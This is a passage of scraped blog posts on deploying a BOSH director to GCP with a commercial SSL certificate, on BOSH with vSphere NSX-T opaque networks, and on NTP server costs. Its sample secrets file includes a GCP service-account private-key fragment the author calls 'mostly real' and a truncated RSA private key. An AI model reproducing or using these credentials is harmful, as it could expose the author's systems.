an intermediate manifest.\nBelow is a visual diagram of the process:\n2. Deploying the BOSH Director to GCP 2.1 Pre-requisites: IP addresses, DNS Records, and SSL Certificates We are deploying our BOSH director to Google Cloud Platform (GCP), so we acquire an external IP address via the GCP console.\n104.154.39.128 — the external IP address acquired from GCP. Note that the IP address need not be a public address — in fact, most BOSH directors have private (RFC 1918) addresses. Having one\u0026rsquo;s BOSH directors reachable solely via a jumpbox adds a layer of security. bosh-gce.nono.io — the DNS record must point to the director\u0026rsquo;s IP address (i.e. 104.154.39.128) (dig +short bosh-gce.nono.io returns the expected IP address). SSL Certificate — we use a wildcard certificate (i.e. *.nono.io), but a wildcard certificate is not necessary, and a regular SSL certificate (e.g. bosh-gce.nono.io) is much less expensive. 2.2 Create a Manifest Operations (gce.yml) File to Insert the SSL Certificate We create a manifest operations YAML file (gce.yml) that contains the directives to adjust the generic BOSH director\u0026rsquo;s manifest template (bosh.yml) to use our CA-issued certificate. Our certificate is a chained certificate, which means that it includes the CA bundle (i.e. the certificates of the CAs that issued our certificate). [Chained Certificate]\nWe use a variables to substitute the SSL certificate and key in our manifest (((nono_io_crt)) and ((nono_io_key)), respectively), which will be interpolated in the second stage (double parentheses, \u0026ldquo;(())\u0026rdquo;, are an indicator to the BOSH CLI parser to perform variable substitution).\nBelow is a shortened version of our manifest operations file; the full one can be viewed on GitHub:\n- type: replace path: /instance_groups/name=bosh/properties/director/ssl/key? value: ((nono_io_key)) - type: replace path: /instance_groups/name=bosh/properties/director/ssl/cert? value: ((nono_io_crt)) 2.3 Create the SSL Certificate (nono.io.crt) File We create a PEM-formatted (Privacy Enhanced Mail) file that contains the SSL chained certificate.\nWe will set the nono_io_crt variable via the CLI to the contents of the nono.io.crt file when we perform our first stage, interpolation, which will substitute the SSL certificate in the appropriate locations.\nOur certificate file can be viewed on GitHub.\n2.4 Run bosh interpolate to Create Intermediate Manifest We run the bosh interpolate to create our intermediate manifest, bosh-gce.yml.\nIf you\u0026rsquo;re not interested in creating an intermediate manifest, you\u0026rsquo;re better off using bosh create-env instead of bosh interpolate; your workflow will be simpler. You can use the same arguments as bosh interpolate, but be sure to include the additional secrets file as a parameter, e.g. -l secrets.yml.\nbosh interpolate ~/workspace/bosh-deployment/bosh.yml \\ -o ~/workspace/bosh-deployment/misc/powerdns.yml \\ -o ~/workspace/bosh-deployment/gcp/cpi.yml \\ -o ~/workspace/bosh-deployment/external-ip-not-recommended.yml \\ -o ~/workspace/bosh-deployment/jumpbox-user.yml \\ -o etc/gce.yml \\ --var-file nono_io_crt=etc/nono.io.crt \\ -v dns_recursor_ip=\u0026#34;169.254.169.254\u0026#34; \\ -v internal_gw=\u0026#34;10.128.0.1\u0026#34; \\ -v internal_cidr=\u0026#34;10.128.0.0/20\u0026#34; \\ -v internal_ip=\u0026#34;10.128.0.2\u0026#34; \\ -v external_ip=\u0026#34;104.154.39.128\u0026#34; \\ -v network=\u0026#34;cf\u0026#34; \\ -v subnetwork=\u0026#34;cf-e6ecf3fd8a498fbe\u0026#34; \\ -v tags=\u0026#34;[ cf-internal, cf-bosh ]\u0026#34; \\ -v zone=\u0026#34;us-central1-b\u0026#34; \\ -v project_id=\u0026#34;blabbertabber\u0026#34; \\ -v director_name=\u0026#34;gce\u0026#34; \\ \u0026gt; bosh-gce.yml The first argument to bosh interpolate is the BOSH director manifest template file, ~/workspace/bosh-deployment/bosh.yml. This has the generic defaults for a BOSH director (e.g. persistent disk size of 32,768MB, the five jobs of the director, etc\u0026hellip;). The source of this file is the bosh-deployment git repo, which has been cloned to ~/workspace/bosh-deployment/ on our workstation.\nThe -o (--ops-file) (\u0026ldquo;manifest operations from a YAML file\u0026rdquo;) are a set of files which configure the BOSH director with specific attributes. With the exception of our custom (gce.yml), the manifest operations files reside in the bosh-deployment repository.\nHere is the list of manifest operations files and their purpose:\nmisc/powerdns.yml: this is only needed for dynamic networks, where the IaaS, rather than the director, assigns IP addresses to the VMs deployed by the director. The BOSH development team is doing interesting work with hostname resolution (DNS), and this particular manifest operations file will likely be deprecated soon. gcp/cpi.yml: this is needed for deploying a BOSH director to GCP, it sets properties such as machine_type (n1-standard-1). external-ip-not-recommended.yml: this is not recommended for general use; it\u0026rsquo;s for deploying a BOSH director with a publicly-accessible IP address. [Security] jumpbox-user.yml: this creates an account, jumpbox, on the director. This account has sudo privileges and can be ssh\u0026rsquo;ed into using an ssh key. In our example, the interpolated variable gce_jumpbox_user_public_key, contains the public key which will be inserted into the file ~jumpbox/.ssh/authorized_keys on the BOSH director. The private key is kept in ~/.ssh/google on our workstation. The command to ssh into our director is the following: ssh -i ~/.ssh/google jumpbox@bosh-gce.nono.io The --var-file nono_io_crt=etc/nono.io.crt directive tells the BOSH CLI to substitute every occurrence of ((nono_io_crt)) with the contents of the file etc/nono.io.crt) (our SSL certificate).\nThe -v arguments set variables which are interpolated, e.g. -v dns_recursor_ip=\u0026quot;169.254.169.254\u0026quot; replaces occurrences of ((dns_recursor_ip)) with 169.254.169.254 in our manifest.\nWe use a script to create our intermediate manifest; our script can be viewed on GitHub.\nOur intermediate manifest (without secrets) can also be seen on GitHub.\n2.5 Create a Secrets File We create a YAML file with our secrets (passwords and keys). These will be substituted during the second stage (bosh create-env). Below is a redacted version of a portion of our file (the passwords aren\u0026rsquo;t the real passwords; don\u0026rsquo;t even bother trying to use them) (the public ssh key, however, is the real deal) (the GCP credentials JSON values are mostly real, too):\nadmin_password: IReturnedAndSawUnderTheSun blobstore_agent_password: ThatTheRaceIsNotToTheSwift blobstore_director_password: NorTheBattleToTheStrong hm_password: NeitherYetBreadToTheWise mbus_bootstrap_password: NorYetRichesToMenOfUnderstanding nats_password: NorYetFavourToMenOfSkill postgres_password: ButTimeAndChanceHappenethToThemAll gce_jumpbox_user_public_key: \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9An3FOF/vUnEA2VkaYHoACjbmk3G4yAHE3lXnGpIhz3EV5k4B5RzEFKZnAIFcX18eBjYQIN9xQO0L9xkhlCyrQHrnXBjCDwt/BuQSiRvp3tlx9g0tGyuuJRI5n656Shc7w/g4UbrQWUBdLKjxTT4kTgAdK+1pgDbhAXdPtMwt4D/sz5OEFdf5O5Cp+0spxC+Ctdb94taZhScqB4xt6dRl7bwI28vZdq6Sjg/hbMBbTXzSJ17+ql8LJtXiUHO5W7MwNtKdZmlglOUy3CEIwDz3FdI9zKEfnfpfosp/hu+07/8Y02+U/fsjQyJy8ZCSsGY2e2XpvNNVj/3mnj8fP5cX cunnie@nono.io\u0026#34; gcp_credentials_json: | { \u0026#34;type\u0026#34;: \u0026#34;service_account\u0026#34;, \u0026#34;project_id\u0026#34;: \u0026#34;blabbertabber\u0026#34;, \u0026#34;private_key_id\u0026#34;: \u0026#34;642493xxxxxxx\u0026#34;, \u0026#34;private_key\u0026#34;: \u0026#34;-----BEGIN PRIVATE KEY-----\\nMIIEvAIBADANBgkqhkiG9w0BYwoIBAQCtNvKlIorU1xlP\\nlXOxMTS8lT2djHXXN2od0l1mR/\\nX4tDHQ2DPvAuKXSLYfgQRuNlydxMQcN7Ln7aDtECgYAgTNO/7a9QjyVyov2tzZMT\\nPG19XeHbuu/SZHcQqa+oEGWwTM02+TUCfaCQVOesxcRHjeGjCJbBC1jaWL7\\nFRSsSpYEPdcaDO9p56CbebgGvrp790EgM1YvacjbW3CoUA\\nG2B88HgJ5MmxAZRCuPaVjg==\\n-----END PRIVATE KEY-----\\n\u0026#34;, \u0026#34;client_email\u0026#34;: \u0026#34;bosh-user@blabbertabber.iam.gserviceaccount.com\u0026#34;, \u0026#34;client_id\u0026#34;: \u0026#34;11221xxxx\u0026#34;, \u0026#34;auth_uri\u0026#34;: \u0026#34;https://accounts.google.com/o/oauth2/auth\u0026#34;, \u0026#34;token_uri\u0026#34;: \u0026#34;https://accounts.google.com/o/oauth2/token\u0026#34;, \u0026#34;auth_provider_x509_cert_url\u0026#34;: \u0026#34;https://www.googleapis.com/oauth2/v1/certs\u0026#34;, \u0026#34;client_x509_cert_url\u0026#34;: \u0026#34;https://www.googleapis.com/robot/v1/metadata/x509/bosh-user%40blabbertabber.iam.gserviceaccount.com\u0026#34; } nono_io_key: | -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEAty5zouKiJfdQQ45DUR1AvhArzgwMAxf/c+2QEKueRSqCfm6l \u0026lt;snip\u0026gt; K+6Y18ijXoJimhW32UhmjnsmeAlq0/0HUvLBCe9mXlA8cWg533V3v30= -----END RSA PRIVATE KEY----- 2.6 Deploying the director Deploying the director is a bit anticlimactic. In this example, we assume the name of the file which contains our secrets which we created in the previous step is named secrets.yml:\nbosh create-env bosh-gce.yml -l secrets.yml In a more complex example (we use LastPass™ to store our secrets in a note named deployments.yml), we take advantage of bash\u0026rsquo;s process substitution to take the output of the LastPass CLI\u0026rsquo;s command and make it appear as a file argument to the BOSH CLI:\nbosh create-env bosh-gce.yml -l \u0026lt;(lpass show --note deployments.yml) Remember to save the bosh-gce-state.json file — it contains the location of the persistent disk, which is important if you ever decide to re-deploy your BOSH director, for the director\u0026rsquo;s state (including deployments, releases, stemcells) is stored on the persistent disk.\n3. Optimizations: Collapse Two Stages into One The two stages can be collapsed into one by dispensing with the bosh interpolate section and merging its options with the bosh create-env step. Indeed, the only advantage of using a two-stage process is the creation of the intermediate BOSH director manifest file, bosh-gce.yml.\n4. SSL Certificates on Other Infrastructures This technique applies equally well to other IaaSes (such as AWS, Azure, and vSphere). As a proof of concept, we have deployed BOSH directors with CA-issued SSL certificates to each of the IaaSes listed below (ignore the \u0026ldquo;forbidden\u0026rdquo; page when clicking BOSH Director links; instead, pay attention to the valid SSL certificate presented to the browser):\nInfrastructure BOSH Director (URL) BOSH Director Manifest Amazon AWS https://bosh-aws.nono.io:25555/info bosh-aws.yml Google GCP https://bosh-gce.nono.io:25555/info bosh-gce.yml Microsoft Azure https://bosh-azure.nono.io:25555/info bosh-azure.yml VMware vSphere https://bosh-vsphere.nono.io:25555/info bosh-vsphere.yml 5. Addendum: UAA and CredHub UAA (CloudFoundry User Account and Authentication) and CredHub are optional BOSH director jobs that replace the built-in BOSH login mechanism [login].\nIntegrating UAA and CredHub into a BOSH director deployed with a commercial SSL certificate is very preliminary and may be incomplete and even broken. Although we have successfully deployed a BOSH director, logged in, and re-created a deployment, we have by no means fully exercised our BOSH director\u0026rsquo;s capabilities. Use caution when following this process.\nWhen deploying UAA and CredHub with our BOSH director, we must do additional modifications to the director manifest to ensure it deploys properly and that we can log in. Specifically, we need to add our certificate to UAA\u0026rsquo;s endpoint (port 8443) and modify the director\u0026rsquo;s manifest to connect to the fully qualified domain name of that endpoint (e.g. https://bosh-gce.nono.io:8443)\nDeploying a BOSH director with an external IP and which is running the CredHub job requires special modifications that have not yet, as of this writing, been incorporated into bosh-deployment. The following modifications were copied from a Slack channel (caveat utor), but they are not enough for our purposes:\n- type: replace path: /variables/name=credhub_tls/options/alternative_names/- value: ((external_ip)) - type: replace path: /variables/name=credhub_tls/options/common_name value: ((external_ip)) - type: replace path: /instance_groups/name=bosh/jobs/name=credhub/properties/credhub/authentication/uaa/url value: \u0026#34;https://((external_ip)):8443\u0026#34; - type: replace path: /instance_groups/name=bosh/properties/director/config_server/uaa/url value: \u0026#34;https://((external_ip)):8443\u0026#34; But the changes above aren\u0026rsquo;t enough for our purposes: although they work well for BOSH directors with auto-generated (self-signed) certificates, they won\u0026rsquo;t work with our commercial certificate (we\u0026rsquo;ll see an error similar to the following: x509: cannot validate certificate for 104.154.39.128 because it doesn't contain any IP SANs).\nTo address this, we set a variable that has FQDN (fully qualified domain name) of the BOSH director (e.g. bosh-gce.nono.io). This must be the same domain name for which our SSL certificate is issued. The name of the variable is unimportant (we named our variable external_fqdn). We name our updated manifest operations file TLS.yml and inject not only the FQDN but also the commercial TLS certificate and key:\n- type: replace path: /instance_groups/name=bosh/jobs/name=uaa/properties/uaa/sslCertificate? value: ((nono_io_crt)) - type: replace path: /instance_groups/name=bosh/jobs/name=uaa/properties/uaa/sslPrivateKey? value: ((nono_io_key)) - type: replace path: /instance_groups/name=bosh/jobs/name=uaa/properties/uaa/url? value: https://((external_fqdn)):8443 - type: replace path: /instance_groups/name=bosh/jobs/name=credhub/properties/credhub/authentication/uaa/ca_certs/- value: ((commercial_ca_crt)) - type: replace path: /instance_groups/name=bosh/jobs/name=credhub/properties/credhub/authentication/uaa/url? value: https://((external_fqdn)):8443 - type: replace path: /instance_groups/name=bosh/properties/director/config_server/uaa/url? value: https://((external_fqdn)):8443 - type: replace path: /instance_groups/name=bosh/properties/director/user_management/uaa/url? value: https://((external_fqdn)):8443 We also set our FQDN variable when invoking BOSH: bosh create-env -v external_fqdn=\u0026quot;bosh-gce.nono.io ...\u0026quot;.\nIf we get an i/o timeout while logging in or performing a BOSH operation, then there\u0026rsquo;s a good chance that we forgot to open up TCP port 8443.\nPerforming request GET \u0026#39;https://bosh-gce.nono.io:25555/tasks?state=processing%!C(MISSING)cancelling%!C(MISSING)queued\u0026amp;verbose=2\u0026#39;: Performing GET request: Requesting token via client credentials grant: Performing request POST \u0026#39;https://bosh-gce.nono.io:8443/oauth/token\u0026#39;: Performing POST request: Retry: Post https://bosh-gce.nono.io:8443/oauth/token: dial tcp bosh-gce.nono.io:8443: i/o timeout To test if UAA and CredHub are working properly, log into your BOSH director (i.e. bosh login).\nAcknowledgements Dmitriy Kalinin suggested collapsing the two stages into one, and making the title more accurate. Danny Berger suggested adopting a more objective tone with respect to the current set of security tools (i.e. iptables, SELinux, AppArmor, auditd).\nFootnotes [Security] The author has mixed feelings for many of the best-practices in the security space; for example, the author feels that firewalls are no substitute for knowing which services should (and should not) be running on one\u0026rsquo;s server and that tools such as AppArmor, SELinux, and auditd often introduce subtle and hard-to-debug failures at the expense of arguably modest security improvements.\n[Chained Certificates] The order in which the certificates appear and whether the root certificate is included is important.\nWe recommend placing the server\u0026rsquo;s certificate topmost and the root certificate last in order to conform with the Transport Layer Security (TLS) Protocol Version 1.2 Request For Comment (RFC):\nThis is a sequence (chain) of certificates. The sender\u0026rsquo;s certificate MUST come first in the list. Each following certificate MUST directly certify the one preceding it. Because certificate validation requires that root keys be distributed independently, the self-signed certificate that specifies the root certificate authority MAY be omitted from the chain, under the assumption that the remote end must already possess it in order to validate it in any case.\nWe recommend omitting the root certificate (and so do others), for it is the one certificate that is included on every client machine, so there\u0026rsquo;s no need to transmit it (and if it\u0026rsquo;s not already on the client machine, then you have bigger worries).\nThe recommendation for certificate ordering has been borne out in practice. Apache, for example, recommends placing the server certificate first, and the root certificate last:\nThe files may also include intermediate CA certificates, sorted from leaf to root\nNginx makes a similar recommendation:\nThe server certificate must appear before the chained certificates in the combined file\nGolang, too:\nA Certificate is a chain of one or more certificates, leaf first.\nFor those curious about how a root certificate differs from a regular certificate, the answer is simple: the root certificate is a self-signed certificate. That is to say, the certificate\u0026rsquo;s Subject is the same as the Issuer.\nWe can use the openssl command to examine our server certificate and determine that the Issuer and Subject are different, and thus be sure that our server certificate is not a root certificate:\n$ openssl x509 -in etc/nono.io.crt -noout -text | egrep \u0026#34;Subject:|Issuer:\u0026#34; Issuer: C=GB, ST=Greater Manchester, L=Salford, O=COMODO CA Limited, CN=COMODO RSA Domain Validation Secure Server CA Subject: OU=Domain Control Validated, OU=PositiveSSL Multi-Domain, CN=*.nono.io The presence of the root certificate in the chain may cause validation problems; The author, for example, recollects fixing a problem where his web server\u0026rsquo;s certificate was flagged as invalid on Android (but not on other platforms). It was fixed by removing the root certificate from the certificate chain file.\n[login] UAA\u0026rsquo;s primary role is as an OAuth2 provider, issuing tokens for client applications to use when they act on behalf of BOSH users, and authenticate users with their BOSH credentials (e.g. bosh login). CredHub manages credentials like passwords, certificates, certificate authorities, SSH keys, RSA keys and arbitrary values (strings and JSON blobs), CredHub provides a CLI and API to get, set, generate and securely store such credentials.\nBibliography [bosh-deployment](https://github.com/cloudfoundry/bosh-deployment) is a GitHub repository containing a collection of manifest templates and manifest operations files. Manifest operations files use the [go-patch](#go_patch) syntax. go-patch is a tool which modifies a target YAML file based on directives, the directives which in turn are are also YAML files. go-patch is the mechanism which the BOSH CLI uses to apply changes to the BOSH template (e.g. external-ip-not-recommended.yml is a go-patch-format file in the bosh-deployment GitHub repo, which, when applied to the bosh.yml manifest file, creates the necessary properties for a BOSH director with an external IP address.\nCorrections \u0026amp; Updates 2017-08-17\nClarified the author\u0026rsquo;s statement with regard to the pros and cons of current security practices. The original statement was controversial and could reflect poorly on the author and the journal. The present statement is more neutral in tone.\nRemoved an incomplete sentence, described the provenance of the --var-store file, clarified the contributions in the Acknowledgements section.\n2017-08-18\nTweaked the wording in the title (added \u0026ldquo;Recognized CA\u0026rdquo;), emphasized collapsing the two stages into one, centered the labels in the boxes, updated the URL for go-patch.\n2017-09-03\nWe dispensed with mbus_bootstrap_ssl file; it was both complex and unnecessary.\nWe fixed a bug where the mbus bootstrap SSL was interpolated incorrectly, resulting in an error (cannot unmarshal !!str 'certifi...' into manifest.Certificate) when using newer versions (\u0026gt;= 2.0.32) of the BOSH CLI.\nWe refactored the SSL certificate into its own file, nono.io.crt.\n2017-09-07\nAdded the section, SSL Certificates on Other Infrastructures.\n2017-12-12\nChanged the title from \u0026ldquo;\u0026hellip; Recognized CA\u0026rdquo; to \u0026ldquo;\u0026hellip; Commercial CA\u0026rdquo;. \u0026ldquo;Commercial\u0026rdquo; is the term Wikipedia uses.\nAdded the section, Addendum: UAA and CredHub.\n","permalink":"https://blog.nono.io/post/bosh-ssl/","summary":"0. Abstract A BOSH director is a virtual machine (VM) orchestrator which deploys VMs to various Infrastructures as a Service (IaaS) such as Amazon Web Services (AWS) and Google Cloud Platform (GCP). The BOSH Command Line (CLI) communicates with the director over Secure Sockets Layer (SSL). While most BOSH directors are deployed with self-signed certificates, it is possible to configure a BOSH director with certificates issued by a recognized certificate authority (CA) (e.","title":"Deploying a BOSH Director With SSL Certificates Issued by Commercial CA"},{"content":"VMware\u0026rsquo;s vSphere is an Infrastructure as a Service (IaaS) which runs Virtual Machines (VMs). BOSH is a VM orchestrator which automates the creation of VMs. NSX-T is a pluggable Network backend for vSphere (and other hypervisors). NSX-T allows the creation of opaque networks in vSphere, networks whose detail and configuration of the network is unknown to vSphere and which is managed outside vSphere.\nWith the release of BOSH vSphere CPI v40, users can attach their BOSH-deployed VMs to an NSX-T opaque network.\nOpaque networks are treated as ordinary BOSH networks; in other words, writers of BOSH manifests need not concern themselves with the underlying type of network whether it be opaque, distributed switch port group or standard switch port group. The manifest need only contain the name of the network; it can be blissfully ignorant of the underlying implementation.\nThis blog post describes how to attach a deployed VM to an opaque network. We first deploy a BOSH director attached to an opaque network via the BOSH CLI, then we use the BOSH director to deploy two VMs to the opaque network.\n0. Quick Start Like other vSphere networks, the name of the opaque network as it appears in vSphere should match the name of the network as it appears under the cloud_properties section of the manifest.\nIn the following screenshot from the vSphere web interface, we can see the opaque network, opaque. The unique icon (a network interface sprouting from a cloud) identifies it as an opaque network.\nIn our corresponding BOSH Cloud Config we specify that VMs placed in the BOSH western_us network should be attached to the vSphere opaque network. Note that under cloud_properties we make sure to use the opaque network name as it appears in vSphere, opaque:\nnetworks: - name: western_us type: manual subnets: - range: 192.168.0.0/24 cloud_properties: name: opaque # must match name of network in vSphere At this point, the seasoned BOSH manifest writer will have enough information to deploy to NSX-T networks, and may find the remainder of this post uninteresting. The remainder of the blog post is directed towards those interested in detailed examples.\n1. Double Deployment: BOSH Director First, VMs Second We will deploy twice to demonstrate BOSH\u0026rsquo;s opaque network feature: first to demonstrate its effectiveness with the BOSH CLI, second to demonstrate its effectiveness with the BOSH director:\nOur first deployment is the BOSH Director itself, using the new BOSH Command Line Interface (CLI) (bosh2). Due to an artifact of our environment [artifact] , The BOSH director cannot attach solely to the opaque network; to work around this restriction, we will attach it to two networks: a distributed virtual port group, scarlet, and the NSX-T opaque network, opaque. Our second deployment is two VMs which reside exclusively on the opaque network. A successful BOSH deploy indicates that the opaque network is functioning properly — a BOSH deploy won\u0026rsquo;t succeed unless the director is able to communicate with the VMs over the network. 1.0 Deploy BOSH Director We use the this manifest to deploy our BOSH director.\nWe type the following commands (note the vcenter_ip and vcenter_password have been obscured) to deploy our BOSH director, log into it, and upload a stemcell:\nbosh2 create-env bosh-vsphere.yml -v vcenter_ip=vcenter.XXXX -v vcenter_password=XXXX -l vsphere-creds.yml bosh2 -e 10.85.46.6 --ca-cert \u0026lt;(bosh2 int vsphere-creds.yml --path /director_ssl/ca) alias-env nsx-t We check our vSphere Web Client to make sure our BOSH director is attached to both networks:\nWe authenticate against our BOSH director and upload a stemcell:\nexport BOSH_CLIENT=admin export BOSH_CLIENT_SECRET=`bosh2 int ./vsphere-creds.yml --path /admin_password` bosh2 -e nsx-t upload-stemcell https://s3.amazonaws.com/bosh-core-stemcells/vsphere/bosh-stemcell-3363.15-vsphere-esxi-centos-7-go_agent.tgz Our director is up and running; we are now ready to use our director to deploy two VMs.\n1.1. Use BOSH Director to Deploy Two VMs We upload our Cloud Config:\nbosh2 -e nsx-t -n update-cloud-config cloud-config-vsphere.yml Now we create a minimal deployment consisting of two VMs (BOSH manifest).\nbosh2 -e nsx-t -n deploy -d minimal minimal.yml We make sure the deploy succeeds — a successful deploy indicates the BOSH director and its two VMs are able to communicate over the opaque network:\n... Task 56 done Succeeded Addendum: Technical Requirements BOSH vSphere CPI v40+ (v40 tested) vSphere 5.5 (VMware vCenter Server Appliance 6.0.0.20000 tested) NSX-T 1.0+ (1.0.1.0.0.4191070 tested) Notes We use bosh-deployment to generate our BOSH director\u0026rsquo;s manifest. We use this custom script which uses this custom configuration. Much of the complexity derives from the need to create a dual-homed director.\nAll hosts in a cluster should have at least one physical interface allocated to NSX-T. If not, VMs deployed to hosts with no physical cards allocated to NSX-T will not be able to communicate.\nIf the operators of a vSphere environment have made the unfortunate decision to identically name multiple networks (e.g. VM Network), the distributed virtual port group will be selected first, followed by the opaque network, followed by the standard switch port group.\nTechnical details: The BOSH vSphere CPI introduces a new code path which examines the type of network to which the VM is being attached, and, if it\u0026rsquo;s an opaque network, uses the vSphere API to apply an opaque-specific backing to the VM\u0026rsquo;s network interface card.\nFootnotes [artifact]\nThe astute reader may ask, \u0026ldquo;Multi-homed? Is there something about NSX-T\u0026rsquo;s opaque networks that require a multi-homed BOSH director?\u0026rdquo;\n[A computer which is attached to more than one network is referred to as a \u0026ldquo;multi-homed\u0026rdquo; computer. Routers and gateways are the canonical multi-homed computers.]\nThe short answer is no, opaque networks do not require a multi-homed BOSH director. The reason we\u0026rsquo;re deploying a multi-homed director is a side-effect of the manner in which the opaque network was created for our environment: it was created without routable IP addresses and without a router. Had it been created with routable IP addresses and had a default gateway attached, a multi-homed director would not have been necessary.\n","permalink":"https://blog.nono.io/post/bosh-vsphere-opaque-networks/","summary":"VMware\u0026rsquo;s vSphere is an Infrastructure as a Service (IaaS) which runs Virtual Machines (VMs). BOSH is a VM orchestrator which automates the creation of VMs. NSX-T is a pluggable Network backend for vSphere (and other hypervisors). NSX-T allows the creation of opaque networks in vSphere, networks whose detail and configuration of the network is unknown to vSphere and which is managed outside vSphere.\nWith the release of BOSH vSphere CPI v40, users can attach their BOSH-deployed VMs to an NSX-T opaque network.","title":"Deploy To vSphere NSX-T Opaque Networks Using BOSH"},{"content":"When Hacker News picked up Part 1 of our series of blog posts on running public NTP servers, a contributor said, \u0026ldquo;I wish he\u0026rsquo;d explained \u0026hellip; what they ultimately did (since there\u0026rsquo;s no part 3 that I can find).\u0026rdquo;\nWe had dropped the ball — we had never concluded the series, had never written part 3, had never described the strategies to mitigate the data transfer costs.\nThis blog post remedies that oversight; it consists of two parts: the first part addresses strategies to reduce the cost of running an NTP server, and the second part discusses side topics (aspects of running an NTP server).\nPerhaps the most dismaying discovery of writing this blog post was the realization that the title is no longer accurate — rather than costing us $500/year, our most expensive NTP server was costing us more than $750/year in data transfer charges. [Traffic increase]\nTable of Contents 0. Previous Posts (Parts 1 \u0026amp; 2) 1. Reducing the Cost of Running an NTP Server 1.0 Statistics (traffic) 1.1 The Right Infrastructure Can Drop the Data Transfer Costs to $0 1.2 Connection Speed Setting 1.3 Geographical Placement 1.4 Rate Limiting 1.5 Join the Pool 2. Side Topics 2.0 The Cavalry is Coming: Google\u0026rsquo;s Public NTP Servers 2.1 The Snapchat Excessive NTP Query Event Cost $13 - $18 (Per Server) 2.2 Are Virtual Machines Adequate NTP Servers? Yes. 2.3 Sometimes It\u0026rsquo;s the Network, not the VM Footnotes Corrections \u0026amp; Updates 0. Previous Posts These posts provide background, but reading them isn\u0026rsquo;t necessary:\nWhy Is My NTP Server Costing $500/Year? Part 1. We analyze our sudden increase in AWS data transfer charges and conclude that adding our server into the NTP pool is the sole reason for the data transfer increase.\nWhy Is My NTP Server Costing Me $500/Year? Part 2: Characterizing the NTP Clients. We characterize the demand that each NTP client places on an NTP server, by operating system. To our surprise, FreeBSD and Ubuntu place the greatest demand on the NTP servers, and Windows and macOS the least.\n1. Reducing the Cost of Running an NTP Server We maintain several servers in the pool.ntp.org project. These servers are personal, not corporate, so we\u0026rsquo;re quite sensitive to cost: we don\u0026rsquo;t want to spend a bundle if we don\u0026rsquo;t have to. Also, these servers have roles other than NTP servers (in fact, their primary purpose is to provide Domain Name System (DNS) service and one is also a Concourse continuous integration (CI) server).\nWhich begs the question: given the expense, why do it? We have several motives:\nWe have benefited greatly from the open source community, and providing this service is a modest way of giving back.\nOur day job is a developer on BOSH, a tool which, at its simplest, creates VMs in the cloud based on specifications passed to it in a file. We use BOSH to deploy our NTP servers, and on at least two occasions we have uncovered obscure bugs as a result.\nOn the rare occasions when our systems fail, often our first warning is an email from the pool with the subject, \u0026ldquo;NTP Pool: Problems with your NTP service\u0026rdquo;. In other words, being in the pool is a great monitoring system, or, at the very least, better than nothing.\n1.0 Statistics (traffic) We have two NTP servers in the pool.ntp.org project whose country is set to \u0026ldquo;United States\u0026rdquo; and whose connection speed is set to \u0026ldquo;1000 Mbit\u0026rdquo;. We have gathered the following statistics [NTP statistics] over a seven-day period (2017-01-21 15:00 UTC - 2017-01-28 15:00 UTC). Note that other than data transfer pricing, the choice of underlying IaaS is unimportant (assuming proper functioning of VM/disk/network). In other words, although the Google Compute Engine (GCE) server carries more traffic than the Amazon Web Services (AWS) server, the roles could have easily been reversed. The mechanism underlying pool.ntp.org project (a multi-stage mechanism which \u0026ldquo;targets the users to servers in/near their country and does a weighted round-robin just on those servers\u0026rdquo;), is not a perfectly precise balancing mechanism (e.g. some clients will \u0026ldquo;stick\u0026rdquo; to a server long after the pool.ntp.org record has updated).\nMetric Amazon Web Services Google Compute Engine packets recvd/sec 3033.89 3115.38 packets sent/sec 2794.60 2909.26 GiB recvd/month 564.71 579.88 GiB sent/month 520.17 541.51 $ / GiB sent $0.09 $0.12 $ / month $46.82 $64.98 Although we present statistics for both inbound (NTP queries to our server) and outbound traffic (NTP responses from our server), it is the outbound traffic which is of particular interest to us, for the inbound traffic is usually free, and the outbound traffic is usually metered (both AWS and GCE charge for outbound traffic but not inbound). We have attempted to maintain a consistent coloring scheme for our charts, using blue for inbound (free) and green for outbound (metered). The mnemonic is that green, the color of US currency, is the metric for which we pay.\n1.1 The Right Infrastructure Can Drop the Data Transfer Costs to $0 We believe that the choice of IaaS is the most important factor in determining costs. For example, running an NTP server on GCE would have an annual cost of $945.36, and running a similar server on DigitalOcean would cost $120 — that represents an 87% reduction in total cost and an annual savings of $825.36.\nOur GCE configuration assumes a g1-small instance (1 shared CPU, 1.7 GiB) RAM ($0.019 per hour) running 24x7 (30% Sustained Use Discount) for a monthly cost of $13.80. We then add the monthly data transfer costs of $64.98 for a monthly total of $78.78, annual total of $945.36.\nDigitalOcean offers 2TB/month free on their $10/month server; which should be adequate for the highest-trafficked NTP servers in the pool (i.e. US-based, 1000 Mbit connection speed), which typically have 1.1 - 1.4 TiB aggregate inbound and outbound traffic. [DigitalOcean bandwidth metering]\nThe NTP server need not reside in an IaaS; it is equally effective in a residence. In fact, savvy home users who have a static IP, have set up an NTP server, and who are comfortable sharing their NTP service with the community at large are encouraged to join the pool.\nIt is particularly important when setting up an NTP server in a residence to set an appropriate connection speed (see next section).\n1.2 Connection Speed Setting The most important tool to control the amount of traffic your NTP server receives is to use the \u0026ldquo;Net speed/connection speed\u0026rdquo; setting in the Manage Servers page. Its thirteen settings cover more than three orders of magnitude.\nUsing our GCE NTP server as an example, at the highest setting (1000 Mbit), we incur $64.98/month, and at the lowest setting (384 Kbit), $0.02/month.\nThe tool isn\u0026rsquo;t precise: as previously mentioned, round-robin DNS is a blunt instrument. We have two NTP servers based in the US whose connection speed is set to 1000Mbit, and yet their outbound traffic differs by 4% (our AWS server carries 4% less traffic than our GCE server). Using the connection speed will get you in the ballpark, but don\u0026rsquo;t expect precision.\nAccording to pool.ntp.org:\nThe net speed is used to balance the load between the pool servers. If your connection is asymmetric (like most DSL connections) you should use the lower speed.\nIn our residence, our cable download speed is 150Mbps, but our upload speed is a mere 10Mbps, so we set our pool.ntp.org\u0026rsquo;s server setting to \u0026ldquo;10Mbit\u0026rdquo;\nThe pool will only use a fraction of the \u0026ldquo;netspeed setting\u0026rdquo;\nThe million-dollar question: what is the fraction, exactly? about 2% worst-case scenario (i.e. server is placed in the United States). Assuming 90 bytes per NTP packet, 1,000,000,000 bits per Gbit, aggregating inbound and outbound (2Gbps total aggregate bandwidth per server), we calculate the bandwidth to be, on our 4 servers, 2.10%, 2.16%, 0.67%, and 0.35%.\nOur home connection is not metered, so we don\u0026rsquo;t incur bandwidth charges (i.e. it\u0026rsquo;s free).\nThe pool.ntp.org project\u0026rsquo;s menu option on the server management page allows you to throttle the traffic on your server. The lower your connection 